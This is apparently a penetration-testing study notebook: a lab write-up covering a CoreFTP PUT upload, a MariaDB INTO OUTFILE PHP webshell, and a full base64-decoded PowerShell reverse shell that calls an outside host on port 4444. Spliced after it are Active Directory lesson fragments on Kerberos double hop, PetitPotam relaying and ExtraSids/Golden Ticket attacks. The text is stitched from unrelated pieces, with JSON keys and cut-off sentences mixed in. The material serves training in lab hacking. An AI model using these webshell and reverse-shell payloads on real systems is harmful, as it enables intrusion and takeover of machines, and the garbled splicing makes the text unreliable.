fiona:987654321  https://10.129.78.187/docs.txtThis  one has no -X PUT and no --data-binary — it's a plain GET request, so there's no local file dependency to fail on, which is exactly why it succeeded while the PUT command failed.The lesson: when a curl command errors out, check whether the error message is actually about your local machine before assuming it's a target/network/auth problem. The fix here was simply confirming the file existed in the expected location (ls -la shell.php) and either cd-ing to the correct directory or recreating the file.Phase 2 — Direct MariaDB Access (and Why This Isn't \"SQL Injection\")Since the cracked credentials worked across services, the next move was connecting directly to the database:mysql -h $target -u fiona -p987654321 --ssl=FALSEThis connected successfully as fiona to a MariaDB 10.4.24 instance. -h specifies the host, -u the username, -p<password> the password (no space between -p and the password when passed this way), and --ssl=FALSE disables SSL/TLS for the connection, which was necessary here.An important terminology correction that came up during this session: what's happening here is not SQL injection, even though it sometimes gets casually called that. True SQL injection is a web application vulnerability — it requires a vulnerable app that takes user-supplied input and drops it, unsanitized, into a SQL query it builds internally, letting an attacker break out of the intended query structure with crafted input (e.g., a login form, a search box, a URL parameter like ?id=1). What actually happened here is much simpler: direct, authenticated access to the database service itself, using valid credentials, through the standard MySQL/MariaDB client. There's no web application involved in this step at all — it's just a database login, functionally no different from SSH-ing in with a valid password.This distinction also matters for methodology: if you don't have direct database credentials and only have a web application in front of you, you'd need to find an actual vulnerable parameter first, confirm it's injectable (does a single quote break the page? does an error message change? does response timing shift with a time-based payload?), and only then would techniques like the one below get appended onto your injected query rather than typed directly into a client.Phase 3 — Writing a Webshell to the Correct Location via SQLTwo checks are worth running before attempting a file write from inside MySQL/MariaDB, since they determine whether it's even possible:sqlSHOW GRANTS FOR CURRENT_USER;\nThis shows the current user's privileges — file read/write from SQL requires the FILE privilege specifically, separate from normal query permissions.sqlSHOW VARIABLES LIKE 'secure_file_priv';\nThis system variable controls where file I/O is allowed: an empty value means no restriction (any path), a specific path means reads/writes are restricted to that directory only, and NULL means the feature is disabled entirely regardless of privileges.With both checks satisfied, the actual write:sqlSELECT \"<?php echo shell_exec($_GET['c']);?>\" INTO OUTFILE 'C:\\xampp\\htdocs\\test2.php';Breaking down the mechanics: SELECT \"<?php echo shell_exec($_GET['c']);?>\" is a completely ordinary query that returns a string literal — the fact that the string happens to be valid PHP code is irrelevant to MySQL, it's just text. INTO OUTFILE 'path' is the clause that changes everything: instead of returning that string to the client (your terminal), MySQL writes it to a file at the given path on the server's disk. The double backslashes (\\) are necessary because backslash is MySQL's string-escape character, so \\ inside the string literal produces a single literal \\ in the actual file path — meaning the real path written is C:\\xampp\\htdocs\\test2.php, not C:\\xampp\\htdocs\\test2.php.Why this specific path works where the CoreFTP path didn't: C:\\xampp\\htdocs\\ is Apache's actual document root under this XAMPP installation. Files placed here genuinely get parsed and executed by PHP when requested — unlike the CoreFTP server root used in Mistake #1, which just serves raw bytes. This is the single most important distinction in the whole exercise: two different HTTP-accessible directories on the same machine, only one of which runs PHP.The payload itself, <?php echo shell_exec($_GET['c']);?>, is about as minimal as a webshell gets: it reads a URL parameter named c, passes its value to PHP's shell_exec() function (which runs a string as an OS shell command and returns the output), and echoes that output back into the HTTP response. Visiting test2.php?c=whoami runs whoami on the server and prints the result to the page.The general reasoning chain worth remembering (this generalizes well beyond this one box): once you have arbitrary SQL execution — through valid credentials or through a genuine injection point — ask whether the specific DBMS exposes any filesystem access. For MySQL/MariaDB, the answer is yes: INTO OUTFILE for writing, LOAD_FILE() for reading. Then ask whether there's a web server sharing that same filesystem, with a document root your database user can actually write into. If both are true, write a file there in a format the web server will execute rather than just serve statically — turning a database-level write primitive into full remote code execution reachable over plain HTTP.Other techniques that occupy the same conceptual slot, worth having in the notebook even though they weren't used on this box:LOAD_FILE() — the read-side counterpart of INTO OUTFILE. Useful for reconnaissance before deciding where to write anything: reading configuration files, application source code, /etc/passwd, and so on.User-Defined Functions (UDFs) — MySQL/MariaDB can load a custom compiled library that exposes new SQL functions. The classic example is lib_mysqludf_sys, which adds sys_exec() and sys_eval() — letting you run OS commands directly from a SQL query, with no webshell or web server involved at all. This requires higher privileges than a simple INTO OUTFILE (you need to be able to write the library file into the MySQL plugin directory), but it's a more direct path to command execution when available.Equivalent primitives on other database engines: Microsoft SQL Server has xp_cmdshell, a built-in stored procedure for direct OS command execution (often disabled by default but re-enabled via sp_configure if you have sufficient privileges). PostgreSQL has COPY ... TO/FROM PROGRAM, which pipes query output through — or reads query input from — an arbitrary OS command.Phase 4 — Basic Command Execution Through the WebshellWith test2.php sitting in the real web root, it became reachable and functional over plain HTTP: http://inlanefreight.htb/test2.php?c=dir%20C:\\Users\\Administrator\\DesktopThis  returned a full directory listing, including flag.txt (39 bytes) — confirming working remote code execution as whatever user Apache was running as.Phase 5 — Upgrading to an Interactive Reverse ShellA one-liner webshell like this works fine for single commands, but it's clunky for anything sustained — every command is a separate HTTP request, there's no persistent working state beyond what you explicitly track, and interactive tools don't work at all. The next step was upgrading to a proper interactive reverse shell using a PowerShell payload delivered as a base64-encoded, UTF-16LE string (the format PowerShell's -e / -EncodedCommand flag expects).Before trusting or running any encoded payload, it was decoded first to confirm exactly what it does:echo \"<base64>\" | base64 -d | iconv -f UTF-16LE -t UTF-8Which revealed:powershell$client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.211\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()This is a standard Nishang-style PowerShell TCP reverse shell. Walking through what it actually does: it opens a raw TCP connection out to 10.10.14.211 on port 4444 (the attacker's machine and listening port), then enters a loop that reads whatever bytes arrive on that connection, decodes them as ASCII text, executes that text as a PowerShell command via iex (Invoke-Expression), captures both normal output and errors, appends a fake PS <current path>> prompt to mimic an interactive console, encodes the result back to bytes, and writes it back down the same TCP connection. The loop repeats until the connection closes. Functionally, this turns a raw TCP socket into something that behaves like an interactive PowerShell session from the listener's point of view.Prerequisite — the listener has to exist before the payload runs, since the payload connects outward immediately on execution with no retry logic shown:nc -lvnp 4444A delivery gotcha worth remembering: passing this payload through the webshell's c URL parameter means it has to survive being embedded in a URL query string. Base64 output routinely contains +, /, and = characters, all of which have specific reserved meanings inside a URL (+ often means a literal space in query strings, = separates keys from values, / is a path separator) — pasting the raw base64 into a browser address bar or an unescaped URL will corrupt it before it ever reaches the server. The actual working request used percent-encoding for the space between powershell and -e: http://10.129.78.187/test2.php?c=powershell%20-e%20&lt;base64-blob>This  succeeded and produced a persistent, interactive-feeling session — confirmed by the fact that the returned prompt (PS C:\\xampp\\htdocs>) stuck around across multiple subsequent commands rather than appearing once and disappearing, which is what you'd expect from the loop structure seen in the decoded payload above.Phase 6 — Post-Exploitation: Confirming Privilege Levelwhoami\nReturned nt authority\\system — full SYSTEM privileges, the highest local privilege level on Windows.whoami /priv\nReturned a full privilege listing, notably with SeDebugPrivilege, SeImpersonatePrivilege, and SeTcbPrivilege all set to Enabled — consistent with genuine SYSTEM-level access rather than a restricted service account impersonating it.Worth noting for the notebook: XAMPP on Windows is frequently installed and run with its Apache service configured under the SYSTEM account (rather than a dedicated, lower-privileged service account), which is a well-known misconfiguration pattern. It means that getting code execution through the web application at all — via the webshell — immediately hands you SYSTEM, with no separate privilege-escalation phase required. That won't be true on every box, but it's common enough with default XAMPP installs to be worth checking for early.Phase 7 — Locating and Retrieving the FlagThe known path from initial recon was C:\\Users\\Administrator\\Desktop\\flag.txt, retrieved directly through the interactive shell established above.For situations where the exact path isn't already known, the general-purpose version of this search:powershellGet-ChildItem -Recurse -Path C:\\ -Include  flag  -File -ErrorAction SilentlyContinueor, when only matching a single pattern (this is provider-native filtering and generally faster than -Include):powershellGet-ChildItem -Path C:\\ -Recurse -Filter  flag  -File -ErrorAction SilentlyContinue-ErrorAction SilentlyContinue is worth always including on a full-drive recursive search — even under SYSTEM, Windows has certain self-referential junction points and reparse points (like the legacy Documents and Settings compatibility link) that throw access errors during recursion and clutter the output otherwise.Mistake #3 — Repeating Mistake #1 With a Second WebshellLater in the session, a more fully-featured PHP webshell (WhiteWinterWolf's wwwolf-php-webshell) was uploaded using the exact same CoreFTP PUT technique from Phase 1 / Mistake #1:curl -k -X PUT -H \"Host:  http://10.129.78.187 \" --basic -u fiona:987654321 --data-binary @/home/WhiteWinterWolf/wwwolf-php-webshell/webshell.php --path-as-is  https://10.129.78.187/webshell.phpThis  returned HTTP/1.1 200 Ok — the write succeeded. But navigating to  https://10.129.78.187/webshell.php  in a browser just triggered a file download instead of rendering or executing anything. This is exactly the same root cause as Mistake #1: the PUT request went to CoreFTP's own built-in HTTP server (again identifiable via the earlier-seen Server: Core FTP HTTP Server and Content-type: application/octet-stream headers), which has no PHP interpreter behind it and can only ever serve raw bytes.The correct fix, and the one actually applied: since a fully working SYSTEM shell already existed via test2.php at this point, there was no need to fight the CoreFTP PUT route for this second webshell at all. The existing shell could simply be used to place the file directly into C:\\xampp\\htdocs\\ instead — for example, hosting the file from the attacker box with python3 -m http.server, then pulling it down from inside the target's PowerShell session with Invoke-WebRequest. Once code execution exists through any path, that path becomes the easiest way to deliver everything else, rather than continuing to route new files through a vulnerability that was never going to execute them in the first place.Reference — LOAD_FILE() for File Reads (Discussed, Not Needed on This Box)Since command execution was already achieved by this point, this wasn't actually needed to solve the box — but it's a core technique worth having fully documented for future engagements where SQL access (or an LFI) is the only foothold available, with no RCE yet.Direct form, when the target path is already known:sqlSELECT LOAD_FILE('C:\\Users\\Administrator\\Desktop\\flag.txt');Discovery form, used when the absolute path isn't known in advance:sqlSELECT LOAD_FILE(CONCAT(@@basedir, 'Path_to_the_flag\\flag.txt'));@@basedir is a MySQL/MariaDB system variable holding the database software's own installation directory (e.g., C:\\xampp\\mysql\\ on a XAMPP install). Since you always know this value with certainty once connected, it functions as a confirmed anchor point — a real, verified path you can build guesses or traversal off of, rather than blindly guessing an entire absolute path from nothing.The same two prerequisite checks from Phase 3 apply here (FILE privilege, secure_file_priv), plus one extra wrinkle specific to reads: the target file also has to be OS-readable by whichever account the MySQL/MariaDB service itself runs as — not the database user you're logged in as. If the service account can't read the file (say, it's ACL'd to Administrator only), LOAD_FILE just silently returns NULL, even with correct SQL-level privileges and no secure_file_priv restriction blocking the path.General methodology for blind file discovery, when you have a file-read primitive but don't know the layout: fingerprint the OS and version first (SELECT @@version_compile_os;, SELECT @@version;), since that narrows down which default paths are worth trying. Lean on well-known default install locations — C:\\xampp, C:\\wamp64\\www, C:\\inetpub\\wwwroot\\ on Windows; /var/www/html/, /etc/ on Linux. Use a small, guaranteed-to-exist file as an initial probe to confirm read access works at all before worrying about anything specific — C:\\Windows\\win.ini on Windows, /etc/passwd on Linux, are both classic choices. Remember that LOAD_FILE() cannot list directory contents — it can only read an exact filename you already have — so for user-specific paths like C:\\Users&lt;name>\\Desktop, the username has to come from somewhere else entirely (SMB enumeration, RID cycling, earlier recon, or just trying very common defaults like Administrator). And prefer combining multiple recon channels over pure blind guessing — verbose error messages, stack traces, exposed .git directories, and misconfigured directory listings frequently leak full server paths for free. Finally: the moment actual command execution is available, this entire blind-guessing approach becomes unnecessary — direct directory listing (dir / Get-ChildItem) is strictly faster and more reliable than reading one guessed file at a time through SQL.Full Mistake RecapMistake 1 (made twice): treated a successful file write via CoreFTP's PUT vulnerability as equivalent to code execution. It isn't — that PUT lands in CoreFTP's own server root, which has no PHP interpreter and only ever serves raw bytes. Happened first with the initial shell.php, and again later with the WhiteWinterWolf webshell. Root cause both times: confusing \"the file was written successfully\" with \"the file will be executed.\"Mistake 2: misread a local curl error (Failed to open shell.php, caused by --data-binary @shell.php looking for a local file that wasn't in the current directory) as a server-side or network problem, when it had nothing to do with the target at all.Mistake 3 (terminology): referred to direct, authenticated MySQL/MariaDB client access — using valid, cracked credentials — as \"SQL injection.\" That term specifically describes exploiting a vulnerable web application's own query construction; this was just a database login, no web app or injection involved.\nMedium was easier.\nit was ftp hiding on 30021 and it allowed anonymous access where I found .txtfile with credentials. after that I brute forced ftp on port 2121 for user simon and found credentials. there I found flag.","description":"As we've seen, email attacks can lead to sensitive data disclosure through direct access to a user's inbox or by combining a misconfiguration with a convincing phishing email. The issue concerns how Kerberos tickets are granted for specific resources. Kerberos tickets should not be viewed as passwords. They are signed pieces of data from the KDC that state what resources an account can access. When we perform Kerberos authentication, we get a \"ticket\" that permits us to access the requested resource (i.e., a single machine). On the contrary, when we use a password to authenticate, that NTLM hash is stored in our session and can be used elsewhere without issue.","description":"Lesson 19 of 28 · AD study path","contentKey":"6029346dc7a75c3cedd5","legacy":false,"category":"Active Directory","keywords":[],"aliases":[],"guide":false,"reviewed":false,"contentRole":"Inside a note","operationIds":[]},{"id":"section-active-directory/kerberos-double-hop#background","title":"Background","href":"/active-directory/kerberos-double-hop#background","route":"active-directory/kerberos-double-hop","trail":"Kerberos Double Hop","kind":"Section","source":"Active Directory/Continued Lessons/19 Kerberos Double Hop.md","subject":"ad","derived":false,"sourceCapture":false,"body":"The \"Double Hop\" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource. This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell. In this situation, the user account being used has the rights to perform an action but is denied access. The most common way to get shells is by attacking an application on the target host or using credentials and a tool such as PSExec. In both of these scenarios, the initial authentication was likely performed over SMB or LDAP, which means the user's NTLM Hash would be stored in memory. Sometimes we have a set of credentials and are restricted to a particular method of authentication, such as WinRM, or would prefer to use WinRM for any number of reasons.\nThe crux of the issue is that when using WinRM to authenticate over two or more connections, the user's password is never cached as part of their login. If we use Mimikatz to look at the session, we'll see that all credentials are blank. As stated previously, when we use Kerberos to establish a remote session, we are not using a password for authentication. When password authentication is used, with PSExec, for example, that NTLM hash is stored in the session, so when we go to access another resource, the machine can pull the hash from memory and authenticate us.\nLet's take a quick look. Our Attack Host is a Parrot box within the corporate network but not joined to the domain. We obtain a set of credentials for a domain user and find that they are part of the Remote Management Users group on DEV01. We want to use PowerView to enumerate the domain, which requires communication with the Domain Controller, DC01.\nDiagram showing attack path: Attack Host to Dev01 (First Hop), then to DC01 (Second Hop).\nWhen we connect to DEV01 using a tool such as evil-winrm, we connect with network authentication, so our credentials are not stored in memory and, therefore, will not be present on the system to authenticate to other resources on behalf of our user. When we load a tool such as PowerView and attempt to query Active Directory, Kerberos has no way of telling the DC that our user can access resources in the domain. This happens because the user's Kerberos TGT (Ticket Granting Ticket) ticket is not sent to the remote session; therefore, the user has no way to prove their identity, and commands will no longer be run in this user's context. In other words, when authenticating to the target host, the user's ticket-granting service (TGS) ticket is sent to the remote service, which allows command execution, but the user's TGT ticket is not sent. When the user attempts to access subsequent resources in the domain, their TGT will not be present in the request, so the remote service will have no way to prove that the authentication attempt is valid, and we will be denied access to the remote service.\nIf unconstrained delegation is enabled on a server, it is likely we won't face the \"Double Hop\" problem. In this scenario, when a user sends their TGS ticket to access the target server, their TGT ticket will be sent along with the request. The target server now has the user's TGT ticket in memory and can use it to request a TGS ticket on their behalf on the next host they are attempting to access. In other words, the account's TGT ticket is cached, which has the ability to sign TGS tickets and grant remote access. Generally speaking, if you land on a box with unconstrained delegation, you already won and aren't worrying about this anyways.","description":"The \"Double Hop\" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource. Here is a quick breakdown of what each CVE provides regarding this vulnerability.\n42278 | 42287\n42278 is a bypass vulnerability with the Security Account Manager (SAM). | 42287 is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.\nThis exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this blog post.\nWe can use this tool to perform this attack. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing Microsoft’s Encrypting File System Remote Protocol (MS-EFSRPC). This technique allows an unauthenticated attacker to take over a Windows domain where Active Directory Certificate Services (AD CS) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as Rubeus or gettgtpkinit.py from PKINITtools to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.\nThis blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.\nLet's walk through the attack. First off, we need to start ntlmrelayx.py in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication. An organization can create various types of trusts:\nParent-child: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain corp.inlanefreight.local could authenticate into the parent domain inlanefreight.local, and vice-versa.\nCross-link: A trust between child domains to speed up authentication.\nExternal: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering or filters out authentication requests (by SID) not from the trusted domain.\nTree-root: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.\nForest: A transitive trust between two forest root domains.\nESAE: A bastion forest used to manage Active Directory.\nWhen establishing a trust, certain elements can be modified depending on the business case.\nTrusts can be transitive or non-transitive.\nA transitive trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if Domain A has a trust with Domain B, and Domain B has a transitive trust with Domain C, then Domain A will automatically trust Domain C.\nIn a non-transitive trust, the child domain itself is the only one trusted.\nDiagram of servers A, B, C representing domains a.com, b.com, c.com, illustrating A=B, B=C, thus A=C.\nAdapted from here","description":"A trust is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where thei","contentKey":"7896dc096cb9300f2956","legacy":false,"category":"Active Directory","keywords":[],"aliases":[],"guide":false,"reviewed":false,"contentRole":"Inside a note","operationIds":[]},{"id":"section-active-directory/trusts-primer#trust-table-side-by-side","title":"Trust Table Side By Side","href":"/active-directory/trusts-primer#trust-table-side-by-side","route":"active-directory/trusts-primer","trail":"Domain Trusts Primer › Domain Trusts Overview","kind":"Section","source":"Active Directory/Continued Lessons/22 Domain Trusts Primer.md","subject":"ad","derived":false,"sourceCapture":false,"body":"Transitive | Non-Transitive\nShared, 1 to many | Direct trust\nThe trust is shared with anyone in the forest | Not extended to next level child domains\nForest, tree-root, parent-child, and cross-link trusts are transitive | Typical for external or custom trust setups\nAn easy comparison to make can be package delivery to your house. For a transitive trust, you have extended the permission to anyone in your household (forest) to accept a package on your behalf. For a non-transitive trust, you have given strict orders with the package that no one other than the delivery service and you can handle the package, and only you can sign for it.\nTrusts can be set up in two directions: one-way or two-way (bidirectional).\nOne-way trust: Users in a trusted domain can access resources in a trusting domain, not vice-versa.\nBidirectional trust: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between INLANEFREIGHT.LOCAL and FREIGHTLOGISTICS.LOCAL, users in INLANEFREIGHT.LOCAL would be able to access resources in FREIGHTLOGISTICS.LOCAL, and vice-versa.\nDomain trusts are often set up incorrectly and can provide us with critical unintended attack paths. Also, trusts set up for ease of use may not be reviewed later for potential security implications if security is not considered before establishing the trust relationship. A Merger & Acquisition (M&A) between two companies can result in bidirectional trusts with acquired companies, which can unknowingly introduce risk into the acquiring company’s environment if the security posture of the acquired company is unknown and untested. If someone wanted to target your organization, they could also look at the other company you acquired for a potentially softer target to attack, allowing them to get into your organization indirectly. It is not uncommon to be able to perform an attack such as Kerberoasting against a domain outside the principal domain and obtain a user that has administrative access within the principal domain. I have performed many penetration tests where this was the case: I was unable to find a foothold in the principal domain, but was able to find a flaw in a trusted domain which, in turn, gave me a foothold, or even full admin rights in the principal domain. This type of \"end-around\" attack could be prevented if security is considered as paramount before establishing any kind of domain trust. As we examine trust relationships, keep these thoughts in mind for reporting. Within the same AD forest, the sidHistory property is respected due to a lack of SID Filtering protection. SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest. In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. In this case, we will leverage the SIDHistory to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.\nTo perform this attack after compromising a child domain, we need the following:\nThe KRBTGT hash for the child domain\nThe SID for the child domain\nThe name of a target user in the child domain (does not need to exist!)\nThe FQDN of the child domain.\nThe SID of the Enterprise Admins group of the root domain.\nWith this data collected, the attack can be performed with Mimikatz.\nNow we can gather each piece of data required to perform the ExtraSids attack. First, we need to obtain the NT hash for the KRBTGT account, which is a service account for the Key Distribution Center (KDC) in Active Directory. The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments. The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account, which should be done periodically and definitely after a penetration test assessment where full domain compromise is reached.\nSince we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.","description":"This attack allows for the compromise of a parent domain once the child domain has been compromised.
